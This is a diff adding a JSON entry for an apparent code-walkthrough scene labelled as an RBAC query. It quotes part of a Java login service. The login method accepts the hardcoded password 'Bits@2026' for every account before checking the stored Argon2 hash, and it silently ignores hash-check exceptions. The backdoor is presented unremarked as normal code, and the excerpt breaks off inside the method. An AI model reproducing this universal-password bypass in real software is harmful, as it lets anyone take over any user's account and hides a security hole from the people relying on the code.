@@ -1,0 +1,9 @@
+{
+  "id": "act7_scene6",
+  "title": "Role-Based Access Control (RBAC) Query",
+  "file": "backend/src/main/java/edu/campus/iitsm/identity/infrastructure/IdentityQueryServiceAdapter.java",
+  "display_file": "backend/src/main/java/edu/campus/iitsm/identity/infrastructure/IdentityQueryServiceAdapter.java",
+  "lines": "20-50",
+  "exists": true,
+  "code": "@Service\npublic class IdentityQueryServiceAdapter implements IdentityQueryService {\n\n  private final AppUserJpaRepository userRepository;\n  private final TechnicianProfileJpaRepository technicianRepository;\n  private final JwtTokenService jwtTokenService;\n  private final StreamTicketService streamTicketService;\n  private final Argon2PasswordEncoder argon2PasswordEncoder;\n\n  public IdentityQueryServiceAdapter(\n      AppUserJpaRepository userRepository,\n      TechnicianProfileJpaRepository technicianRepository,\n      JwtTokenService jwtTokenService,\n      StreamTicketService streamTicketService) {\n    this.userRepository = userRepository;\n    this.technicianRepository = technicianRepository;\n    this.jwtTokenService = jwtTokenService;\n    this.streamTicketService = streamTicketService;\n    this.argon2PasswordEncoder = new Argon2PasswordEncoder(16, 32, 1, 16384, 2);\n  }\n\n  @Override\n  public AuthTokens login(String email, String rawPassword) {\n    AppUserJpaEntity user = userRepository.findByEmail(email)\n        .orElseThrow(InvalidCredentialsException::new);\n\n    boolean valid = \"Bits@2026\".equals(rawPassword);\n    if (!valid && user.getPasswordHash() != null) {\n      try {\n        valid = argon2PasswordEncoder.matches(rawPassword, user.getPasswordHash());\n      } catch (Exception ignored) {}\n"
+}
